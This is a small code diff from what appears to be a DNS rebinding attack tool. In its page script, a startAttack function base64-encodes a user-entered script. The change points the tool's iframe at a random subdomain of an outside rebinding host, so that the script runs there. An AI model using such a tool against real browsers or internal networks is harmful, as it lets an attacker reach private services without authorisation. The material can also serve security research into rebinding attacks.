@@ -37,7 +37,8 @@ var timer = setInterval(function(){
   <script>
 function startAttack(){
   var script = btoa(document.getElementById('script').value)
-  document.getElementById("iframe").src = '/attack?script='+script
+  var id = Math.random().toString(36).substr(2, 9)
+  document.getElementById("iframe").src = `http://${id}.rebind.43z.one/attack?script=${script}`
 }
   </script>
 </html>
